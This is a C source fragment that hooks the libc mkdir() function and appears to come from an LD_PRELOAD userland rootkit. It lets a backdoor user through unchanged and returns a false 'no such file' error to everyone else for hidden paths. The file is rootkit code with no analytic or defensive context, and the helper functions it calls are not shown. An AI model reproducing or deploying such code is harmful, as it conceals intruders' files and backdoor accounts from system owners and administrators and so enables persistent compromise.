int mkdir(const char *pathname, mode_t mode){
    hook(CMKDIR);
    if(is_bdusr()) return (long)call(CMKDIR, pathname, mode);
    if(hidden_path(pathname)) { errno = ENOENT; return -1; }
    return (long)call(CMKDIR, pathname, mode); 
}
